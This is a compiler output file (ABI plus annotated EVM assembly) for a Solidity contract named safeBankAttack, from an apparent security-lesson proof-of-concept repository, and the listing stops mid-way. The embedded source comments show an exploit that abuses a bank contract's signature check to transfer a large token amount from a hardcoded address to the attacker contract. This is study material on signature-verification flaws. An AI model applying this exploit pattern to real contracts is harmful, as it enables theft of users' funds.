{
	"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol": {
		"safeBankAttack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "bank_addr",
							"type": "address"
						},
						{
							"internalType": "bytes",
							"name": "sig",
							"type": "bytes"
						}
					],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getHash",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":189:679  contract safeBankAttack {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":189:679  contract safeBankAttack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x8c5a2ac8\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd13319c4\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":427:677  function attack(address bank_addr, bytes memory sig) public {... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      tag_8\n      jump\t// in\n    tag_5:\n      stop\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":219:421  function getHash() public view returns (bytes32) {... */\n    tag_4:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":427:677  function attack(address bank_addr, bytes memory sig) public {... */\n    tag_8:\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":507:516  bank_addr */\n      dup2\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":497:530  IsafeBank(bank_addr).safeTransfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x76b82a91\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":539:581  0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf */\n      0x7e5f4552091a69125d5dfcb7b8c2659029395bdf\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":591:595  this */\n      address\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":597:620  10000000000000000000000 */\n      0x021e19e0c9bab2400000\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":622:625  sig */\n      dup6\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":497:626  IsafeBank(bank_addr).safeTransfer(address(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf),address(this),10000000000000000000000, sig) */\n      mload(0x40)\n      dup6\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_14\n      swap5\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_18:\n      pop\n      pop\n      pop\n      pop\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":646:655  bank_addr */\n      dup2\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":636:668  IsafeBank(bank_addr).isCompleted */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xfa391c64\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":636:670  IsafeBank(bank_addr).isCompleted() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_19\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_19:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_21\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_21:\n      pop\n      pop\n      pop\n      pop\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":427:677  function attack(address bank_addr, bytes memory sig) public {... */\n      pop\n      pop\n      jump\t// out\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":219:421  function getHash() public view returns (bytes32) {... */\n    tag_10:\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":259:266  bytes32 */\n      0x00\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":320:362  0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf */\n      0x7e5f4552091a69125d5dfcb7b8c2659029395bdf\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":373:396  10000000000000000000000 */\n      0x021e19e0c9bab2400000\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":407:411  this */\n      address\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":295:413  abi.encodePacked(address(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf), uint256(10000000000000000000000), address(this)) */\n      add(0x20, mload(0x40))\n      tag_23\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":285:414  keccak256(abi.encodePacked(address(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf), uint256(10000000000000000000000), address(this))) */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":278:414  return keccak256(abi.encodePacked(address(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf), uint256(10000000000000000000000), address(this))) */\n      swap1\n      pop\n        /* \"SecLessonPoc-main/contracts/verifySign/attack/safeBankAttack.sol\":219:421  function getHash() public view returns (bytes32) {... */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:82   */\n    tag_25:\n        /* \"#utility.yul\":40:46   */\n      0x00\n        /* \"#utility.yul\":73:75   */\n      0x40\n        /* \"#utility.yul\":67:76   */\n      mload\n        /* \"#utility.yul\":57:76   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:82   */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_26:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":211:328   */\n    tag_27:\n        /* \"#utility.yul\":320:321   */\n      0x00\n        /* \"#utility.yul\":317:318   */\n      dup1\n        /* \"#utility.yul\":310:322   */\n      revert\n        /* \"#utility.yul\":334:460   */\n    tag_28:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":411:453   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":404:409   */\n      dup3\n        /* \"#utility.yul\":400:454   */\n      and\n        /* \"#utility.yul\":389:454   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:460   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":466:562   */\n    tag_29:\n        /* \"#utility.yul\":503:510   */\n      0x00\n        /* \"#utility.yul\":532:556   */\n      tag_66\n        /* \"#utility.yul\":550:555   */\n      dup3\n        /* \"#utility.yul\":532:556   */\n      tag_28\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":521:556   */\n      swap1\n      pop\n        /* \"#utility.yul\":466:562   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":568:690   */\n    tag_30:\n        /* \"#utility.yul\":641:665   */\n      tag_68\n        /* \"#utility.yul\":659:664   */\n      dup2\n        /* \"#utility.yul\":641:665   */\n      tag_29\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":634:639   */\n      dup2\n        /* \"#utility.yul\":631:666   */\n      eq\n        /* \"#utility.yul\":621:684   */\n      tag_69\n      jumpi\n        /* \"#utility.yul\":680:681   */\n      0x00\n        /* \"#utility.yul\":677:678   */\n      dup1\n        /* \"#utility.yul\":670:682   */\n      revert\n        /* \"#utility.yul\":621:684   */\n    tag_69:\n        /* \"#utility.yul\":568:690   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":696:835   */\n    tag_31:\n        /* \"#utility.yul\":742:747   */\n      0x00\n        /* \"#utility.yul\":780:786   */\n      dup2\n        /* \"#utility.yul\":767:787   */\n      calldataload\n        /* \"#utility.yul\":758:787   */\n      swap1\n      pop\n        /* \"#utility.yul\":796:829   */\n      tag_71\n        /* \"#utility.yul\":823:828   */\n      dup2\n        /* \"#utility.yul\":796:829   */\n      tag_30\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":696:835   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":841:958   */\n    tag_32:\n        /* \"#utility.yul\":950:951   */\n      0x00\n        /* \"#utility.yul\":947:948   */\n      dup1\n        /* \"#utility.yul\":940:952   */\n      revert\n        /* \"#utility.yul\":964:1081   */\n    tag_33:\n        /* \"#utility.yul\":1073:1074   */\n      0x00\n        /* \"#utility.yul\":1070:1071   */\n      dup1\n        /* \"#utility.yul\":1063:1075   */\n      revert\n        /* \"#utility.yul\":1087:1189   */\n    tag_34:\n        /* \"#utility.yul\":1128:1134   */\n      0x00\n        /* \"#utility.yul\":1179:1181   */\n      0x1f\n        /* \"#utility.yul\":1175:1182   */\n      not\n        /* \"#utility.yul\":1170:1172   */\n      0x1f\n        /* \"#utility.yul\":1163:1168   */\n      dup4\n        /* \"#utility.yul\":1159:1173   */\n      add\n        /* \"#utility.yul\":1155:1183   */\n      and\n        /* \"#utility.yul\":1145:1183   */\n      swap1\n      pop\n        /* \"#utility.yul\":1087:1189   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1195:1375   */\n    tag_35:\n        /* \"#utility.yul\":1243:1320   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1240:1241   */\n      0x00\n        /* \"#utility.yul\":1233:1321   */\n      mstore\n        /* \"#utility.yul\":1340:1344   */\n      0x41\n        /* \"#utility.yul\":1337:1338   */\n      0x04\n        /* \"#utility.yul\":1330:1345   */\n      mstore\n        /* \"#utility.yul\":1364:1368   */\n      0x24\n        /* \"#utility.yul\":1361:1362   */\n      0x00\n        /* \"#utility.yul\":1354:1369   */\n      revert\n        /* \"#utility.yul\":1381:1662   */\n    tag_36:\n        /* \"#utility.yul\":1464:1491   */\n      tag_77\n        /* \"#utility.yul\":1486:1490   */\n      dup3\n        /* \"#utility.yul\":1464:1491   */\n      tag_34\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":1456:1462   */\n      dup2\n        /* \"#utility.yul\":1452:1492   */\n      add\n        /* \"#utility.yul\":1594:1600   */\n      dup2\n        /* \"#utility.yul\":1582:1592   */\n      dup2\n        /* \"#utility.yul\":1579:1601   */\n      lt\n        /* \"#utility.yul\":1558:1576   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":1546:1556   */\n      dup3\n        /* \"#utility.yul\":1543:1577   */\n      gt\n        /* \"#utility.yul\":1540:1602   */\n      or\n        /* \"#utility.yul\":1537:1625   */\n      iszero\n      tag_78\n      jumpi\n        /* \"#utility.yul\":1605:1623   */\n      tag_79\n      tag_35\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":1537:1625   */\n    tag_78:\n        /* \"#utility.yul\":1645:1655   */\n      dup1\n        /* \"#utility.yul\":1641:1643   */\n      0x40\n        /* \"#utility.yul\":1634:1656   */\n      mstore\n        /* \"#utility.yul\":1424:1662   */\n      pop\n        /* \"#utility.yul\":1381:1662   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1668:1797   */\n    tag_37:\n        /* \"#utility.yul\":1702:1708   */\n      0x00\n        /* \"#utility.yul\":1729:1749   */\n      tag_81\n      tag_25\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":1719:1749   */\n      swap1\n      pop\n        /* \"#utility.yul\":1758:1791   */\n      tag_82\n        /* \"#utility.yul\":1786:1790   */\n      dup3\n        /* \"#utility.yul\":1778:1784   */\n      dup3\n        /* \"#utility.yul\":1758:1791   */\n      tag_36\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":1668:1797   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1803:2110   */\n    tag_38:\n        /* \"#utility.yul\":1864:1868   */\n      0x00\n        /* \"#utility.yul\":1954:1972   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":1946:1952   */\n      dup3\n        /* \"#utility.yul\":1943:1973   */\n      gt\n        /* \"#utility.yul\":1940:1996   */\n      iszero\n      tag_84\n      jumpi\n        /* \"#utility.yul\":1976:1994   */\n      tag_85\n      tag_35\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":1940:1996   */\n    tag_84:\n        /* \"#utility.yul\":2014:2043   */\n      tag_86\n        /* \"#utility.yul\":2036:2042   */\n      dup3\n        /* \"#utility.yul\":2014:2043   */\n      tag_34\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":2006:2043   */\n      swap1\n      pop\n        /* \"#utility.yul\":2098:2102   */\n      0x20\n        /* \"#utility.yul\":2092:2096   */\n      dup2\n        /* \"#utility.yul\":2088:2103   */\n      add\n        /* \"#utility.yul\":2080:2103   */\n      swap1\n      pop\n        /* \"#utility.yul\":1803:2110   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2116:2262   */\n    tag_39:\n        /* \"#utility.yul\":2213:2219   */\n      dup3\n        /* \"#utility.yul\":2208:2211   */\n      dup2\n        /* \"#utility.yul\":2203:2206   */\n      dup4\n        /* \"#utility.yul\":2190:2220   */\n      calldatacopy\n        /* \"#utility.yul\":2254:2255   */\n      0x00\n        /* \"#utility.yul\":2245:2251   */\n      dup4\n        /* \"#utility.yul\":2240:2243   */\n      dup4\n        /* \"#utility.yul\":2236:2252   */\n      add\n        /* \"#utility.yul\":2229:2256   */\n      mstore\n        /* \"#utility.yul\":2116:2262   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2268:2691   */\n    tag_40:\n        /* \"#utility.yul\":2345:2350   */\n      0x00\n        /* \"#utility.yul\":2370:2435   */\n      tag_89\n        /* \"#utility.yul\":2386:2434   */\n      tag_90\n        /* \"#utility.yul\":2427:2433   */\n      dup5\n        /* \"#utility.yul\":2386:2434   */\n      tag_38\n      jump\t// in\n    tag_90:\n        /* \"#utility.yul\":2370:2435   */\n      tag_37\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":2361:2435   */\n      swap1\n      pop\n        /* \"#utility.yul\":2458:2464   */\n      dup3\n        /* \"#utility.yul\":2451:2456   */\n      dup2\n        /* \"#utility.yul\":2444:2465   */\n      mstore\n        /* \"#utility.yul\":2496:2500   */\n      0x20\n        /* \"#utility.yul\":2489:2494   */\n      dup2\n        /* \"#utility.yul\":2485:2501   */\n      add\n        /* \"#utility.yul\":2534:2537   */\n      dup5\n        /* \"#utility.yul\":2525:2531   */\n      dup5\n        /* \"#utility.yul\":2520:2523   */\n      dup5\n        /* \"#utility.yul\":2516:2532   */\n      add\n        /* \"#utility.yul\":2513:2538   */\n      gt\n        /* \"#utility.yul\":2510:2622   */\n      iszero\n      tag_91\n      jumpi\n        /* \"#utility.yul\":2541:2620   */\n      tag_92\n      tag_33\n      jump\t// in\n    tag_92:\n        /* \"#utility.yul\":2510:2622   */\n    tag_91:\n        /* \"#utility.yul\":2631:2685   */\n      tag_93\n        /* \"#utility.yul\":2678:2684   */\n      dup5\n        /* \"#utility.yul\":2673:2676   */\n      dup3\n        /* \"#utility.yul\":2668:2671   */\n      dup6\n        /* \"#utility.yul\":2631:2685   */\n      tag_39\n      jump\t// in\n    tag_93:\n        /* \"#utility.yul\":2351:2691   */\n      pop\n        /* \"#utility.yul\":2268:2691   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2710:3048   */\n    tag_41:\n        /* \"#utility.yul\":2765:2770   */\n      0x00\n        /* \"#utility.yul\":2814:2817   */\n      dup3\n        /* \"#utility.yul\":2807:2811   */\n      0x1f\n        /* \"#utility.yul\":2799:2805   */\n      dup4\n        /* \"#utility.yul\":2795:2812   */\n      add\n        /* \"#utility.yul\":2791:2818   */\n      slt\n        /* \"#utility.yul\":2781:2903   */\n      tag_95\n      jumpi\n        /* \"#utility.yul\":2822:2901   */\n      tag_96\n      tag_32\n      jump\t// in\n    tag_96:\n        /* \"#utility.yul\":2781:2903   */\n    tag_95:\n        /* \"#utility.yul\":2939:2945   */\n      dup2\n        /* \"#utility.yul\":2926:2946   */\n      calldataload\n        /* \"#utility.yul\":2964:3042   */\n      tag_97\n        /* \"#utility.yul\":3038:3041   */\n      dup5\n        /* \"#utility.yul\":3030:3036   */\n      dup3\n        /* \"#utility.yul\":3023:3027   */\n      0x20\n        /* \"#utility.yul\":3015:3021   */\n      dup7\n        /* \"#utility.yul\":3011:3028   */\n      add\n        /* \"#utility.yul\":2964:3042   */\n      tag_40\n      jump\t// in\n    tag_97:\n        /* \"#utility.yul\":2955:3042   */\n      swap2\n      pop\n        /* \"#utility.yul\":2771:3048   */\n      pop\n        /* \"#utility.yul\":2710:3048   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3054:3706   */\n    tag_7:\n        /* \"#utility.yul\":3131:3137   */\n      0x00\n        /* \"#utility.yul\":3139:3145   */\n      dup1\n        /* \"#utility.yul\":3188:3190   */\n      0x40\n        /* \"#utility.yul\":3176:3185   */\n      dup4\n        /* \"#utility.yul\":3167:3174   */\n      dup6\n        /* \"#utility.yul\":3163:3186   */\n      sub\n        /* \"#utility.yul\":3159:3191   */\n      slt\n        /* \"#utility.yul\":3156:3275   */\n      iszero\n      tag_99\n      jumpi\n        /* \"#utility.yul\":3194:3273   */\n      tag_100\n      tag_26\n      jump\t// in\n    tag_100:\n        /* \"#utility.yul\":3156:3275   */\n    tag_99:\n        /* \"#utility.yul\":3314:3315   */\n      0x00\n        /* \"#utility.yul\":3339:3392   */\n      tag_101\n        /* \"#utility.yul\":3384:3391   */\n      dup6\n        /* \"#utility.yul\":3375:3381   */\n      dup3\n        /* \"#utility.yul\":3364:3373   */\n      dup7\n        /* \"#utility.yul\":3360:3382   */\n      add\n        /* \"#utility.yul\":3339:3392   */\n      tag_31\n      jump\t// in\n    tag_101:\n        /* \"#utility.yul\":3329:3392   */\n      swap3\n      pop\n        /* \"#utility.yul\":3285:3402   */\n      pop\n        /* \"#utility.yul\":3469:3471   */\n      0x20\n        /* \"#utility.yul\":3458:3467   */\n      dup4\n        /* \"#utility.yul\":3454:3472   */\n      add\n        /* \"#utility.yul\":3441:3473   */\n      calldataload\n        /* \"#utility.yul\":3500:3518   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":3492:3498   */\n      dup2\n        /* \"#utility.yul\":3489:3519   */\n      gt\n        /* \"#utility.yul\":3486:3603   */\n      iszero\n      tag_102\n      jumpi\n        /* \"#utility.yul\":3522:3601   */\n      tag_103\n      tag_27\n      jump\t// in\n    tag_103:\n        /* \"#utility.yul\":3486:3603   */\n    tag_102:\n        /* \"#utility.yul\":3627:3689   */\n      tag_104\n        /* \"#utility.yul\":3681:3688   */\n      dup6\n        /* \"#utility.yul\":3672:3678   */\n      dup3\n        /* \"#utility.yul\":3661:3670   */\n      dup7\n        /* \"#utility.yul\":3657:3679   */\n      add\n        /* \"#utility.yul\":3627:3689   */\n      tag_41\n      jump\t// in\n    tag_104:\n        /* \"#utility.yul\":3617:3689   */\n      swap2\n      pop\n        /* \"#utility.yul\":3412:3699   */\n      pop\n        /* \"#utility.yul\":3054:3706   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3712:3789   */\n    tag_42:\n        /* \"#utility.yul\":3749:3756   */\n      0x00\n        /* \"#utility.yul\":3778:3783   */\n      dup2\n        /* \"#utility.yul\":3767:3783   */\n      swap1\n      pop\n        /* \"#utility.yul\":3712:3789   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3795:3913   */\n    tag_43:\n        /* \"#utility.yul\":3882:3906   */\n      tag_107\n        /* \"#utility.yul\":3900:3905   */\n      dup2\n        /* \"#utility.yul\":3882:3906   */\n      tag_42\n      jump\t// in\n    tag_107:\n        /* \"#utility.yul\":3877:3880   */\n      dup3\n        /* \"#utility.yul\":3870:3907   */\n      mstore\n        /* \"#utility.yul\":3795:3913   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3919:4141   */\n    tag_12:\n        /* \"#utility.yul\":4012:4016   */\n      0x00\n        /* \"#utility.yul\":4050:4052   */\n      0x20\n        /* \"#utility.yul\":4039:4048   */\n      dup3\n        /* \"#utility.yul\":4035:4053   */\n      add\n        /* \"#utility.yul\":4027:4053   */\n      swap1\n      pop\n        /* \"#utility.yul\":4063:4134   */\n      tag_109\n        /* \"#utility.yul\":4131:4132   */\n      0x00\n        /* \"#utility.yul\":4120:4129   */\n      dup4\n        /* \"#utility.yul\":4116:4133   */\n      add\n        /* \"#utility.yul\":4107:4113   */\n      dup5\n        /* \"#utility.yul\":4063:4134   */\n      tag_43\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":3919:4141   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4147:4265   */\n    tag_44:\n        /* \"#utility.yul\":4234:4258   */\n      tag_111\n        /* \"#utility.yul\":4252:4257   */\n      dup2\n        /* \"#utility.yul\":4234:4258   */\n      tag_29\n      jump\t// in\n    tag_111:\n        /* \"#utility.yul\":4229:4232   */\n      dup3\n        /* \"#utility.yul\":4222:4259   */\n      mstore\n        /* \"#utility.yul\":4147:4265   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4271:4378   */\n    tag_45:\n        /* \"#utility.yul\":4338:4345   */\n      0x00\n        /* \"#utility.yul\":4367:4372   */\n      dup2\n        /* \"#utility.yul\":4356:4372   */\n      swap1\n      pop\n        /* \"#utility.yul\":4271:4378   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4384:4461   */\n    tag_46:\n        /* \"#utility.yul\":4421:4428   */\n      0x00\n        /* \"#utility.yul\":4450:4455   */\n      dup2\n        /* \"#utility.yul\":4439:4455   */\n      swap1\n      pop\n        /* \"#utility.yul\":4384:4461   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4467:4527   */\n    tag_47:\n        /* \"#utility.yul\":4495:4498   */\n      0x00\n        /* \"#utility.yul\":4516:4521   */\n      dup2\n        /* \"#utility.yul\":4509:4521   */\n      swap1\n      pop\n        /* \"#utility.yul\":4467:4527   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4533:4735   */\n    tag_48:\n        /* \"#utility.yul\":4613:4622   */\n      0x00\n        /* \"#utility.yul\":4646:4729   */\n      tag_116\n        /* \"#utility.yul\":4664:4728   */\n      tag_117\n        /* \"#utility.yul\":4673:4727   */\n      tag_118\n        /* \"#utility.yul\":4721:4726   */\n      dup5\n        /* \"#utility.yul\":4673:4727   */\n      tag_45\n      jump\t// in\n    tag_118:\n        /* \"#utility.yul\":4664:4728   */\n      tag_47\n      jump\t// in\n    tag_117:\n        /* \"#utility.yul\":4646:4729   */\n      tag_46\n      jump\t// in\n    tag_116:\n        /* \"#utility.yul\":4633:4729   */\n      swap1\n      pop\n        /* \"#utility.yul\":4533:4735   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4741:4932   */\n    tag_49:\n        /* \"#utility.yul\":4858:4925   */\n      tag_120\n        /* \"#utility.yul\":4919:4924   */\n      dup2\n        /* \"#utility.yul\":4858:4925   */\n      tag_48\n      jump\t// in\n    tag_120:\n        /* \"#utility.yul\":4853:4856   */\n      dup3\n        /* \"#utility.yul\":4846:4926   */\n      mstore\n        /* \"#utility.yul\":4741:4932   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4938:5036   */\n    tag_50:\n        /* \"#utility.yul\":4989:4995   */\n      0x00\n        /* \"#utility.yul\":5023:5028   */\n      dup2\n        /* \"#utility.yul\":5017:5029   */\n      mload\n        /* \"#utility.yul\":5007:5029   */\n      swap1\n      pop\n        /* \"#utility.yul\":4938:5036   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5042:5210   */\n    tag_51:\n        /* \"#utility.yul\":5125:5136   */\n      0x00\n        /* \"#utility.yul\":5159:5165   */\n      dup3\n        /* \"#utility.yul\":5154:5157   */\n      dup3\n        /* \"#utility.yul\":5147:5166   */\n      mstore\n        /* \"#utility.yul\":5199:5203   */\n      0x20\n        /* \"#utility.yul\":5194:5197   */\n      dup3\n        /* \"#utility.yul\":5190:5204   */\n      add\n        /* \"#utility.yul\":5175:5204   */\n      swap1\n      pop\n        /* \"#utility.yul\":5042:5210   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5216:5462   */\n    tag_52:\n        /* \"#utility.yul\":5297:5298   */\n      0x00\n        /* \"#utility.yul\":5307:5420   */\n    tag_124:\n        /* \"#utility.yul\":5321:5327   */\n      dup4\n        /* \"#utility.yul\":5318:5319   */\n      dup2\n        /* \"#utility.yul\":5315:5328   */\n      lt\n        /* \"#utility.yul\":5307:5420   */\n      iszero\n      tag_126\n      jumpi\n        /* \"#utility.yul\":5406:5407   */\n      dup1\n        /* \"#utility.yul\":5401:5404   */\n      dup3\n        /* \"#utility.yul\":5397:5408   */\n      add\n        /* \"#utility.yul\":5391:5409   */\n      mload\n        /* \"#utility.yul\":5387:5388   */\n      dup2\n        /* \"#utility.yul\":5382:5385   */\n      dup5\n        /* \"#utility.yul\":5378:5389   */\n      add\n        /* \"#utility.yul\":5371:5410   */\n      mstore\n        /* \"#utility.yul\":5343:5345   */\n      0x20\n        /* \"#utility.yul\":5340:5341   */\n      dup2\n        /* \"#utility.yul\":5336:5346   */\n      add\n        /* \"#utility.yul\":5331:5346   */\n      swap1\n      pop\n        /* \"#utility.yul\":5307:5420   */\n      jump(tag_124)\n    tag_126:\n        /* \"#utility.yul\":5454:5455   */\n      0x00\n        /* \"#utility.yul\":5445:5451   */\n      dup5\n        /* \"#utility.yul\":5440:5443   */\n      dup5\n        /* \"#utility.yul\":5436:5452   */\n      add\n        /* \"#utility.yul\":5429:5456   */\n      mstore\n        /* \"#utility.yul\":5278:5462   */\n      pop\n        /* \"#utility.yul\":5216:5462   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5468:5841   */\n    tag_53:\n        /* \"#utility.yul\":5554:5557   */\n      0x00\n        /* \"#utility.yul\":5582:5620   */\n      tag_128\n        /* \"#utility.yul\":5614:5619   */\n      dup3\n        /* \"#utility.yul\":5582:5620   */\n      tag_50\n      jump\t// in\n    tag_128:\n        /* \"#utility.yul\":5636:5706   */\n      tag_129\n        /* \"#utility.yul\":5699:5705   */\n      dup2\n        /* \"#utility.yul\":5694:5697   */\n      dup6\n        /* \"#utility.yul\":5636:5706   */\n      tag_51\n      jump\t// in\n    tag_129:\n        /* \"#utility.yul\":5629:5706   */\n      swap4\n      pop\n        /* \"#utility.yul\":5715:5780   */\n      tag_130\n        /* \"#utility.yul\":5773:5779   */\n      dup2\n        /* \"#utility.yul\":5768:5771   */\n      dup6\n        /* \"#utility.yul\":5761:5765   */\n      0x20\n        /* \"#utility.yul\":5754:5759   */\n      dup7\n        /* \"#utility.yul\":5750:5766   */\n      add\n        /* \"#utility.yul\":5715:5780   */\n      tag_52\n      jump\t// in\n    tag_130:\n        /* \"#utility.yul\":5805:5834   */\n      tag_131\n        /* \"#utility.yul\":5827:5833   */\n      dup2\n        /* \"#utility.yul\":5805:5834   */\n      tag_34\n      jump\t// in\n    tag_131:\n        /* 